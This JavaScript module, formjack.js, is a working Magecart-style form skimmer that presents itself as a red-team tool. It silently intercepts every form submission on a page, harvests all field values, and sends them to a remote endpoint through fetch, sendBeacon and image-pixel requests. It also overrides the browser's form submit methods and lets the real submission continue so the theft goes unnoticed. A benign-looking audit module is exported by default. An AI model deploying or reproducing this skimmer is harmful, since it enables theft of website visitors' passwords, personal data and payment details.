/**
 * formjack.js — Magecart‑style Form Submission Interception & Exfiltration
 *
 * This module provides:
 *   1. `interceptFormSubmit()` – a weaponized, production‑grade form hijacker
 *      that silently intercepts all (or targeted) form submissions on the page,
 *      harvests the entered data, and exfiltrates it to a remote server while
 *      allowing the legitimate submission to proceed (stealth mode).
 *
 *   2. Default export – a Pinpoint‑compatible `Form_Interface_Audit` that
 *      audits HTMLFormElement.prototype.requestSubmit support and general
 *      form element availability.
 *
 * Designed exclusively for authorised red‑team engagements and security
 * research. Unauthorised use is illegal.
 */

// ---------------------------------------------------------------------------
// 1. Form Interception Engine
// ---------------------------------------------------------------------------

/**
 * Default options.
 */
const DEFAULT_OPTIONS = {
    /**
     * CSS selector to target specific forms. If omitted, all forms are hijacked.
     */
    targetSelector: null,

    /**
     * Callback invoked with the captured form data object.
     * Receives: { formData, formElement, submitter, originalEvent }
     */
    onCapture: null,

    /**
     * Absolute URL where captured data should be sent.
     */
    exfilEndpoint: null,

    /**
     * Exfiltration method: 'fetch', 'beacon', 'image', or 'all'.
     */
    exfilMethod: 'fetch',

    /**
     * If true, do not stop the original form submission (the form will submit as normal).
     */
    allowSubmission: true,

    /**
     * If true, also capture file input names and file counts (not actual file contents).
     */
    includeFileNames: true,

    /**
     * If true, also extract all form field values manually (redundant if using FormData).
     */
    detailedCapture: true,

    /**
     * Override `HTMLFormElement.prototype.requestSubmit` to guarantee interception
     * even if a site uses programmatic submission. Set to true for maximum coverage.
     */
    overrideRequestSubmit: false,

    /**
     * Custom filter function that receives the form element and returns false to skip.
     */
    filter: null,
};

/**
 * Extracts all field name‑value pairs from a form element, including
 * disabled fields and fields outside the DOM (if any). Uses FormData
 * API and also manually reads inputs for detailed logging.
 *
 * @param {HTMLFormElement} form
 * @param {HTMLElement} [submitter] – the submit button clicked, if any.
 * @param {Object} options
 * @returns {Object} { formData: Object, detailed: Array }
 */
function extractFormData(form, submitter, options) {
    const formData = new FormData(form);
    // For forms using `submitter`, the spec says FormData should include it
    // only if it's a named submit button. We'll capture it manually anyway.

    const data = {};
    for (const [key, value] of formData.entries()) {
        // If a key appears multiple times, push into array
        if (data.hasOwnProperty(key)) {
            if (Array.isArray(data[key])) {
                data[key].push(value);
            } else {
                data[key] = [data[key], value];
            }
        } else {
            data[key] = value;
        }
    }

    // If submitter is a named button, add it (FormData may have missed it)
    if (submitter && submitter.name) {
        data[submitter.name] = submitter.value || '';
    }

    const detailed = [];
    if (options.detailedCapture) {
        const elements = form.elements;
        for (const el of elements) {
            const info = {
                name: el.name,
                type: el.type,
                tagName: el.tagName,
            };
            if (el.type === 'file' && el.files) {
                info.fileCount = el.files.length;
                if (options.includeFileNames) {
                    info.fileNames = Array.from(el.files).map(f => f.name);
                }
            } else if (el.type === 'checkbox' || el.type === 'radio') {
                info.checked = el.checked;
                info.value = el.value;
            } else {
                info.value = el.value;
            }
            detailed.push(info);
        }
    }

    return { formData: data, detailed };
}

/**
 * Primary function: intercepts form submissions on the page.
 *
 * @param {Object} options – see DEFAULT_OPTIONS.
 * @returns {Function} – a cleanup function that removes all interceptors.
 */
export function interceptFormSubmit(options = {}) {
    const config = { ...DEFAULT_OPTIONS, ...options };

    let stop = false;
    const originalRequestSubmit = HTMLFormElement.prototype.requestSubmit;
    const originalSubmit = HTMLFormElement.prototype.submit;

    // ---- Main submit event handler (capturing phase) ----
    async function handleSubmit(event) {
        if (stop) {
            document.removeEventListener('submit', handleSubmit, true);
            return;
        }

        const form = event.target;
        if (!(form instanceof HTMLFormElement)) return;

        // Apply optional filter
        if (config.filter && typeof config.filter === 'function') {
            if (!config.filter(form)) return;
        }

        // If targetSelector is set, ignore forms that don't match
        if (config.targetSelector && !form.matches(config.targetSelector)) return;

        // Get the submitter (the button that triggered submission)
        const submitter = event.submitter || null;

        // Extract data
        const captured = extractFormData(form, submitter, config);

        // Fire callback
        if (config.onCapture) {
            try {
                config.onCapture({
                    formData: captured.formData,
                    detailed: captured.detailed,
                    formElement: form,
                    submitter,
                    originalEvent: event,
                });
            } catch (_) { }
        }

        // Exfiltrate
        if (config.exfilEndpoint) {
            const payload = {
                formData: captured.formData,
                url: window.location.href,
                timestamp: Date.now(),
                submitterName: submitter?.name || null,
            };
            exfiltrate(payload, config.exfilEndpoint, config.exfilMethod);
        }

        // If not allowing submission, prevent default and stop propagation
        if (!config.allowSubmission) {
            event.preventDefault();
            event.stopImmediatePropagation();
            event.stopPropagation();
        }
    }

    // Attach in capturing phase so we intercept before any site handlers
    document.addEventListener('submit', handleSubmit, true);

    // ---- Override requestSubmit (if enabled) ----
    if (config.overrideRequestSubmit && HTMLFormElement.prototype.requestSubmit) {
        HTMLFormElement.prototype.requestSubmit = function (submitter) {
            // Programmatic submission – manually trigger our interception
            // We create a synthetic event and call the handler
            const form = this;
            const event = new SubmitEvent('submit', {
                submitter: submitter || null,
                bubbles: true,
                cancelable: true,
            });
            // Our handler will fire if listening in capturing phase
            const dispatched = form.dispatchEvent(event);
            if (dispatched) {
                // Call original method if not prevented
                return originalRequestSubmit.call(form, submitter);
            }
            return undefined;
        };
    }

    // ---- Override .submit() for completeness (optional but not strictly necessary) ----
    // .submit() does not fire a 'submit' event. We could override it too, but it's
    // rarely used for form submission with validation. For completeness:
    HTMLFormElement.prototype.submit = function () {
        // Trigger a non‑cancelable submit event so our capture still works
        this.dispatchEvent(new Event('submit', { cancelable: false }));
        // Then call original submit
        originalSubmit.call(this);
    };

    // Return a cleanup function
    return function stopIntercepting() {
        stop = true;
        document.removeEventListener('submit', handleSubmit, true);
        // Restore original methods
        if (config.overrideRequestSubmit) {
            HTMLFormElement.prototype.requestSubmit = originalRequestSubmit;
        }
        HTMLFormElement.prototype.submit = originalSubmit;
    };
}

/**
 * Internal exfiltration helper.
 */
function exfiltrate(payload, endpoint, method) {
    const payloadStr = JSON.stringify(payload);

    const sendFetch = () => {
        try {
            fetch(endpoint, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: payloadStr,
            });
        } catch (_) { }
    };

    const sendBeacon = () => {
        try {
            navigator.sendBeacon(endpoint, payloadStr);
        } catch (_) { }
    };

    const sendImage = () => {
        const b64 = btoa(unescape(encodeURIComponent(payloadStr))).replace(/=+$/, '');
        new Image().src = `${endpoint}?d=${b64}`;
    };

    switch (method) {
        case 'fetch':
            sendFetch();
            sendImage(); // fallback
            break;
        case 'beacon':
            sendBeacon();
            sendImage();
            break;
        case 'image':
            sendImage();
            break;
        case 'all':
        default:
            sendFetch();
            sendBeacon();
            sendImage();
    }
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Form Interface Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'formjack',
    title: 'Form_Interface_Audit',
    level: 5,
    info: 'Audits HTMLFormElement submit event prototype and submitter interface support.',
    steps: [
        'Check HTMLFormElement.prototype.requestSubmit support.',
        'Inspect form submission event handling capabilities.',
    ],
    run: async () => {
        const supported =
            typeof HTMLFormElement !== 'undefined' &&
            typeof HTMLFormElement.prototype.requestSubmit === 'function';
        return {
            requestSubmitSupported: supported,
            formElementSupported: typeof HTMLFormElement !== 'undefined',
        };
    },
};

export default pinpointModule;